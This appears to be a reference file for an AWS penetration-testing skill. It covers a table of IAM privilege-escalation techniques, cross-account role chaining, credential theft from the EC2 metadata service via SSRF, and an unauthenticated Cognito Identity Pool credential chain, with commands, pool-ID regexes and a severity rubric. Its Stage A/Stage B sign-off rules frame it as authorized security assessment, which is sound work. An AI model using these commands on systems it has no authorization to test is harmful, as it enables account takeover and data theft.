# AWS depth

> Reference for `cloud-iam-deep`. Moved out of SKILL.md (2026-10) to keep the body under 500 lines; content kept verbatim except where marked "refreshed". The proof call (`sts get-access-key-info`, `sts get-caller-identity`) and first read-only enumeration stay in SKILL.md.
>
> Stage A is reading: identity, IAM policies, trust documents, resource names. Everything that executes a row of the privesc table, assumes a role beyond the proof call, or reads data is Stage B and needs written sign-off.

## AWS privesc patterns (24+ documented — `iam_privesc` techniques)

Quick lookup — if you have any of these IAM actions, escalate via the listed technique:

| You have | Escalate via |
|---|---|
| `iam:CreateAccessKey` | Create access key on any user → impersonate |
| `iam:CreateLoginProfile` | Set a console password on a user → login |
| `iam:UpdateLoginProfile` | Reset console password on a user |
| `iam:AttachUserPolicy` | Attach AdministratorAccess to self |
| `iam:AttachGroupPolicy` | Attach AdministratorAccess to a group you're in |
| `iam:AttachRolePolicy` + sts:AssumeRole | Attach to a role you can assume |
| `iam:PutUserPolicy` | Inline AdministratorAccess to self |
| `iam:PutGroupPolicy` | Inline policy on a group |
| `iam:PutRolePolicy` | Inline on a role you can assume |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:UpdateAssumeRolePolicy` + sts:AssumeRole | Modify trust to allow self |
| `iam:CreatePolicyVersion` | Create v2 of an attached policy with admin |
| `iam:SetDefaultPolicyVersion` | Switch attached policy to admin version |
| `iam:PassRole` + ec2:RunInstances | Launch EC2 as admin role → use instance creds |
| `iam:PassRole` + lambda:CreateFunction/InvokeFunction | Run code as admin role |
| `iam:PassRole` + cloudformation:CreateStack | CF stack creates resources as admin |
| `iam:PassRole` + glue:CreateDevEndpoint | Notebook runs as admin role |
| `iam:PassRole` + datapipeline | Pipeline runs as admin role |
| `iam:PassRole` + codestar:CreateProject | New project gets admin role |
| `iam:PassRole` + bedrock-agentcore:CreateCodeInterpreter + bedrock-agentcore:InvokeCodeInterpreter | AgentCore Code Interpreter created with a more privileged execution role → code runs as that role (hackingthe.cloud) |
| `ec2:RunInstances` (with admin instance profile already on the AMI) | Spin instance, exfil creds from IMDS |
| `lambda:UpdateFunctionCode` (function has admin role) | Replace code → exfil creds |
| `lambda:UpdateFunctionConfiguration` | Add layer / env var that exfils |
| `cloudformation:UpdateStack` | Modify stack to grant self admin |
| `sts:AssumeRole` (where trust allows you) | Direct privilege jump |

Many of the destructive ones are out-of-scope for an external red-team; document the path, don't always execute.

---

## AWS — STS / cross-account / role chaining

```bash
# Enumerate roles you can assume across accounts
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output json > /tmp/roles.json
# Parse for "Principal.AWS" containing different account IDs

# Stage B (written sign-off): everything below this line uses the trust, it does not just read it.
# Stage A proof of a cross-account trust is the trust policy text from list-roles / get-role above.
# Assume a role
aws sts assume-role --role-arn "arn:aws:iam::OTHER_ACCT:role/CrossAccountRole" --role-session-name "rt-1"

# Set new creds
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Verify
aws sts get-caller-identity  # should now show OTHER_ACCT

# Re-enumerate from new identity (chain continues)
```

**Confused-deputy pattern:** look for `sts:ExternalId` missing or trust policies that allow `arn:aws:iam::*:role/*`. If `ExternalId` is not required, anyone can assume the role.

Read-only check of a single trust (Stage A, needs `iam:GetRole`):

```bash
aws iam get-role --role-name <RoleName> --query 'Role.AssumeRolePolicyDocument'
# Red flags: Principal "*" or a third-party account root without a sts:ExternalId condition.
# OIDC (Federated) principals: see references/iac-state-and-ci-tokens.md
```

---

## AWS IMDSv1 / IMDSv2 abuse via SSRF

```bash
# IMDSv1 (legacy, still common — straight GET):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Returns role name → fetch creds:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# JSON with AccessKeyId, SecretAccessKey, Token, Expiration

# IMDSv2 (requires PUT to get a token first — usually mitigates SSRF):
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
TOKEN=...
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF bypass for IMDSv2:
# Most server-side fetchers don't issue PUT requests → IMDSv2 blocks them.
# Exception: SSRF in functions that themselves perform requests with custom headers.
```

### IMDSv2 defaults, 2023-2026 (refreshed 2026-10)

What makes IMDSv1 still reachable today, so you can say why it worked in the report:

- Amazon Linux 2023 (March 2023) uses IMDSv2 by default; console Quick Start launches went IMDSv2-only in November 2023; AWS announced that EC2 instance types released from mid-2024 use IMDSv2 only by default. IMDSv1 can still be turned back on at or after launch (AWS News Blog, "Amazon EC2 Instance Metadata Service IMDSv2 by default").
- Precedence at launch is: launch parameters / launch template, then the account-level default for the Region, then the AMI. An AMI registered with `imds-support v2.0` sets `HttpTokens=required` and hop limit 2, but an explicit `HttpTokens=optional` in a launch template overrides it.
- Account-level defaults: `aws ec2 modify-instance-metadata-defaults` / `get-instance-metadata-defaults`. `HttpTokensEnforced=enabled` makes launches with `optional` fail. The defaults can be owned by an AWS Organizations declarative policy (`managedBy: declarative-policy`), in which case the account cannot change them.
- Hop limit is the number of network hops the PUT response may make. AWS notes that a hop limit of 1 can cause issues in container environments, so container hosts often run 2, which also lets a token reach an SSRF inside a container (EC2 user guide, "Configure the Instance Metadata Service options").
- IPv6 endpoint `http://[fd00:ec2::254]` exists only on Nitro instances in IPv6-enabled subnets and only when explicitly enabled. Worth one try when an SSRF filter blocks `169.254.169.254` literally.
- ECS task roles and EKS Pod Identity do not use IMDS (EKS Pod Identity serves credentials from `169.254.170.23`); the endpoint catalog for SSRF lives in `hunt-cloud-misconfig`.

Owner-side read-only confirmation once you hold creds in the account (Stage A):

```bash
aws ec2 get-instance-metadata-defaults --region <region>
aws ec2 describe-instances --region <region> \
  --query 'Reservations[].Instances[].[InstanceId,MetadataOptions.HttpTokens,MetadataOptions.HttpPutResponseHopLimit,MetadataOptions.HttpEndpoint]' \
  --output table
```

---

## AWS Cognito Identity Pool — Unauthenticated-Role Attack Chain (2024-2026 surface)

AWS Cognito has two distinct services often confused: **User Pools** (auth provider) and **Identity Pools** (federated identity → IAM credentials). Identity Pools can be configured with *"Enable access to unauthenticated identities"* — which gives ANY anonymous caller an IAM role via `cognito-identity:GetId` → `cognito-identity:GetCredentialsForIdentity`. Mobile apps and SPAs ship the IdentityPoolId in the page bundle. Developers commonly attach overly-broad IAM permissions to the unauth role, especially when the pool was set up for AWS Amplify / Pinpoint / CloudWatch RUM and the role policy was never narrowed.

> Scope note (2026-10): this IAM-role chain stays here. Cognito User Pool flows (self sign-up, attribute tampering) and other BaaS backends (Firebase, Supabase) are owned by `hunt-cloud-backends`. Since IAM identity-provider controls, a new or edited role trusting `cognito-identity.amazonaws.com` must carry a `cognito-identity.amazonaws.com:aud` condition; roles created earlier are not re-evaluated (IAM user guide, "Identity-provider controls for shared OIDC providers").

### Step 1 — Discover the IdentityPoolId

The IdentityPoolId is a **public identifier** by AWS design (`<region>:<UUID>` format). The find:

```bash
# JS bundle / SPA regex (against *.js, *.html, source-map files)
grep -ErohE "identityPoolId[\"'`\s:=]+[\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\"']" .
grep -ErohE "IdentityPoolId[\"'`\s:=]+[\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\"']" .
grep -ErohE "\"PoolId\"\s*:\s*\"([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})\"" .

# Mobile APK (after jadx decompile)
grep -rEi "identity[_-]?pool[_-]?id" decoded/
grep -rE "\"[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}\"" decoded/

# Also check
amplifyconfiguration.json
awsconfiguration.json
aws-exports.js
.env.js
*.js.map
```

Wayback CDX captures, GitHub code-search for the apex domain + `IdentityPoolId`, and JS chunks linked from `index.html` are the high-yield search corpora.

### Step 2 — `GetId` (unauth)

```bash
aws cognito-identity get-id \
  --identity-pool-id us-east-1:abcd1234-5678-90ab-cdef-1234567890ab \
  --region us-east-1 \
  --no-sign-request
```

`--no-sign-request` is critical — tells the CLI not to look for ambient AWS credentials. Returns `{"IdentityId": "us-east-1:<uuid>"}`. If this returns `NotAuthorizedException`, unauth identities are disabled — stop, not exploitable.

### Step 3 — `GetCredentialsForIdentity`

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:<returned-uuid> \
  --region us-east-1 \
  --no-sign-request
```

Returns real STS credentials with ~1 hour TTL: `AccessKeyId` (ASIA…), `SecretKey`, `SessionToken`, `Expiration`.

### Step 4 — Confirm role ARN

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

Returns role ARN like `arn:aws:sts::<account>:assumed-role/Cognito_<PoolName>Unauth_Role/CognitoIdentityCredentials`. Account ID is now disclosed.

### Step 5 — Enumerate role permissions

Direct (rare):
```bash
aws iam get-role --role-name Cognito_<PoolName>Unauth_Role
aws iam list-role-policies --role-name Cognito_<PoolName>Unauth_Role
aws iam list-attached-role-policies --role-name Cognito_<PoolName>Unauth_Role
```

Blackbox (the normal case) — fire a permission probe across high-value services and observe `AccessDenied` vs success. Pacu's `iam__enum_permissions --role-name <name>` brute-forces ~500 IAM actions; `enumerate-iam.py` by Andrés Riancho covers ~1000. Common over-permissions: `s3:Get*`/`s3:List*`, `dynamodb:Scan`, `lambda:InvokeFunction`, `appsync:GraphQL`, `cognito-idp:AdminCreateUser`, `iam:PassRole`, `kms:Decrypt`.

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| Unauth role with `*:*` or `AdministratorAccess` | **Critical** (9.8+) | Full AWS account takeover |
| Unauth role with `s3:Get*` / `s3:List*` on production customer buckets, or `dynamodb:Scan` on user tables | **Critical** (9.1-9.8) | Mass PII / data breach |
| Unauth role with `appsync:GraphQL` on production API, or `lambda:InvokeFunction` on internal lambdas | **Critical** (9.0) | Authenticated backend access |
| Unauth role with `cognito-idp:Admin*` on the linked User Pool | **Critical** (9.1) | Mass ATO primitive |
| Unauth role with `iam:PassRole` + create-function | **Critical** (9.8) | Documented priv-esc to admin |
| Unauth role with `s3:PutObject` on web-hosting bucket | **High** (8.1) | Stored XSS / supply-chain |
| Unauth role with `kms:Decrypt` on a customer CMK | **High** (7.5-8.5) | Depends on ciphertext reachability |
| Unauth role with read-only on a single hardcoded non-sensitive resource | **Medium** (5.3) | Limited business impact |
| Unauth identities enabled but role policy denies everything | **Informational** | Best-practice deviation only |

### Disclosed cases / authoritative writeups

1. **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020, refreshed 2023)** — original research establishing the attack class. `GetCredentialsForIdentity` against unauth pools with default `*` policies. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
2. **Rhino Security Labs — Pacu `cognito__enum_identity_pools` module** — production tooling that automates Steps 1-5 of the chain. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu/tree/master/pacu/modules/cognito__enum_identity_pools)
3. **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — walkthrough of identityPoolId extraction → assume guest role → S3/DynamoDB/Lambda enumeration. Calls out RUM, Amplify, Pinpoint as the three SDKs that commonly expose the pool ID in HTML. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
4. **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook covering Steps 1-5. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
5. **Spaceraccoon / Eugene Lim — "Mass Account Takeover via Cognito IdentityPool" (Medium, 2020)** — SaaS provider exposed IdentityPoolId in Amplify config; unauth role had `cognito-idp:AdminConfirmSignUp` + `AdminUpdateUserAttributes` on the linked User Pool — silent confirmation of any signup + email change = mass ATO.
6. **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry across Datadog customer base showing real-world Cognito pool abuse. Non-trivial percentage of pools paired with policies broader than the minimum required. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)

### Reporting tip

> Steps 2-4 are the Stage A proof. The data-pull PoC in the list below reads customer data and is Stage B: get written sign-off, pull one record, redact it.

Always include in the report:
- `sts get-caller-identity` output (proves the role ARN + account ID)
- Pacu `iam__enum_permissions` JSON output (proves the granted actions)
- A concrete data-pull PoC (one sample S3 object listing, one DynamoDB record with PII redacted)

Without all three, triagers downgrade to Medium. The 60-second test is `GetId → GetCredentialsForIdentity → sts get-caller-identity`. If you reach step 3 anonymously, you have a finding.

Cross-reference: `hunt-cloud-misconfig` → `CloudWatch RUM weaponization` covers the specific RUM-embedded variant of this attack class.
